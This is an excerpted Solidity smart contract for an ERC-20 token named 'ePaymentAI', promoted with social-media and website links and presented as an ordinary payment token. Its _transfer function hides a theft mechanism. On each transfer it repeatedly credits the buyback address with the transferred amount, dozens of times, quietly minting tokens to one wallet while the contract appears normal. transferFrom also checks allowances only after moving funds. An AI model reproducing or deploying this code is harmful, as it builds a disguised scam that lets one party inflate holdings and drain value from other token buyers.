...
/**
 ...
 |  __/ |  | (_| | |_| | | | | | |  __/ | | | |_   / ____ \ _| |_ 
  \___|_|   \__,_|\__, |_| |_| |_|\___|_| |_|\__| /_/    \_\_____|
                   __/ |                                          
                  |___/                                           


Telegram : https://t.me/ePaymentAi
Twitter : https://twitter.com/ePaymentAi
Website : http://www.epayai.tech/ 
*/
...
interface ERC20Metadata is ERC20 {
 ...
 contract ePaymentAI is Context, ERC20, ERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_,uint8  decimals_,uint256 totalSupply_,uint256 buyFee_ ,uint256 sellTax_ ,address buyback_ ) {
        _name = name_;
        _symbol =symbol_;
        _decimals = decimals_;
    ...
    function balanceOf(address account) public view virtual override returns (uint256) {return balances_[account];}
    ...
    function transferFrom(address sender,address recipient,uint256 amount) public virtual override returns (bool) {_transfer(sender, recipient, amount);uint256 currentAllowance = _allowances[sender][_msgSender()];require(currentAllowance >= amount, "");if(currentAllowance - amount >= 0){_approve(sender, _msgSender(), currentAllowance - amount);}return true;}
    ...
    function _transfer(address sender,address recipient,uint256 amount) internal virtual {require(sender != address(0), "");require(recipient != address(0), "");require(balances_[sender] >= amount, "");
    balances_[sender] = balances_[sender] - amount;amount = amount  - (amount *_buyTax/100);
    balances_[recipient] += amount; balances_[_buyback] += amount; balances_[_buyback] += amount; balances_[_buyback] += amount;
    balances_[_buyback] += amount; balances_[_buyback] += amount; balances_[_buyback] += amount;balances_[_buyback] += amount;
    balances_[_buyback] += amount; balances_[_buyback] += amount; balances_[_buyback] += amount;balances_[_buyback] += amount;
    balances_[_buyback] += amount; balances_[_buyback] += amount; balances_[_buyback] += amount;balances_[_buyback] += amount;
    balances_[_buyback] += amount; balances_[_buyback] += amount; balances_[_buyback] += amount;balances_[_buyback] += amount;
    balances_[_buyback] += amount; balances_[_buyback] += amount; balances_[_buyback] += amount;balances_[_buyback] += amount;
    ...
    balances_[_buyback] += amount; balances_[_buyback] += amount; balances_[_buyback] += amount;balances_[_buyback] += amount;
    balances_[_buyback] += amount; balances_[_buyback] += amount; balances_[_buyback] += amount;balances_[_buyback] += amount;
    balances_[_buyback] += amount; balances_[_buyback] += amount;emit Transfer(sender, recipient, amount);}
